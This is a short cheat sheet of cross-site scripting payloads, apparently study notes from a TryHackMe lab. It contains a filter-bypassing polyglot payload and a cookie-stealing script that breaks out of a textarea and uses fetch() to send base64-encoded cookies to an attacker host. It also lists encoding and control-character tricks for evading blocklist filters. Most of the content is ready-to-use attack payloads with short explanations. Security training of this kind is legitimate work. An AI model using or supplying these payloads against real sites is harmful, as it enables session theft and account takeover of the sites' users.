# XSS

```txt
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

**Purpose:**

* Case variation (`jaVasCript`) → bypass naive case-sensitive filters
* Inline comment abuse (`/* */`) → break keyword detection
* Mixed encodings (`%0D%0A`, `\x3c`) → evade pattern matching

```txt
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

**Purpose:**

* Break out of `<textarea>` context
* Execute JavaScript via `<script>`
* Exfiltrate cookies using:

  * `document.cookie`
  * `btoa()` (base64 encoding to avoid transmission issues)
  * `fetch()` to send data to attacker-controlled endpoint

---

## Evasion

You can use public repositories to craft custom XSS payloads for experimentation. A solid starting point is the [XSS Payload List](https://github.com/payloadbox/xss-payload-list).

When facing payload length restrictions, [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads) help create minimal payloads that still execute.

If filters rely on blocklists, simple encoding tricks can bypass detection. Injecting control characters like tabs, new lines, or carriage returns breaks pattern matching:

* Horizontal Tab (TAB) → `0x09`
* New Line (LF) → `0x0A`
* Carriage Return (CR) → `0x0D`

These can be inserted into payloads to evade filters. Example transformation of:

```html
<IMG SRC="javascript:alert('XSS');">
```

Becomes:

```txt
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

---
